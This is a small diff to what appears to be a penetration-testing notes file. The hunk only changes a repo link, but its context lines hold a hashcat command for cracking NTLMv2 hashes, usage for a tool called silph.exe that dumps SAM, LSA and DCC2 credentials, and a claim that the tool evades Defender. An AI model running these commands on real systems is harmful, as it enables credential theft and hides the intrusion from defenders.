@@ -101,7 +101,7 @@ hashcat -m 5600 NTLMv2.txt /usr/share/wordlist/rockyou.txt
 - This tool will able to bypass and Dump all secrets like Sam hashes,lsa and dcc2 Hashes.
 - Non Detectable by Defender.
 
-Repo link:- [sliph.exe](unknow)
+Repo link:- sliph.exe
 ### Usage:-
 ```bash
 PS C:\Users\Administrator\Desktop> ./silph.exe -dcc2 -lsa -sam
